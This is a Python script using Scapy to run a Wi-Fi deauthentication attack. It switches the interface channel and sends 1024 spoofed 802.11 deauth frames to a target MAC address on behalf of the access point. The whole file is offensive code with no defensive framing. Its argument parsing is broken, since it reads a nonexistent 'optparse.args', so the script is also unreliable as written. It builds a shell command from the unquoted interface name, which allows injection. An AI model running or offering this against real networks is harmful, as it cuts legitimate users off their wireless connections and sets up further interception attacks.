from scapy.all import *
import optparse
import os

conf.verb = 0

dest = optparse.args.dest
src = optparse.args.src
ssid = optparse.args.ssid
ch = optparse.args.ch
iface = optparse.args.iface

START_SEQNUM = 1  # sequence number
SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
WARN_STR = "[\x1b[31m!\x1b[0m]"
INFO_STR = "\x1b[33m-\x1b[0m"

def deauth_attack():
    os.system('clear')
    # Channel Switching
    channel_switch(iface, ch)
    show_info()

    # Deauthentication
    deauth_frame = RadioTap()\
            /Dot11(type=0, subtype=12, addr1=dest, addr2=src, addr3=src)\
            /Dot11Deauth(reason=7)
    
    print(WARN_STR+" Attack")
    for i in range(0, 1024):
        sendp(deauth_frame, iface=iface)
        printProgressBar()

def printProgressBar():
    print("\x1b[36m->\x1b[0m",end="",flush=True)

def channel_switch(iface,ch):
    print(WARN_STR+" Channel Switching : Ch."+str(ch))
    os.system('iwconfig ' + iface + ' channel ' + str(ch))

def show_info():
    print(SYSTEM_STR+" Information")
    print("\t"+INFO_STR+" Destination MAC Address : %s" % dest)
    print("\t"+INFO_STR+" Source MAC Address : %s" % src)
    print("\t"+INFO_STR+" SSID Information : %s" % ssid)
    print("\t"+INFO_STR+" Channel : Ch.%s" % ch)
    print("\t"+INFO_STR+" Interface : %s" % iface)

if __name__=='__main__':
    deauth_attack()
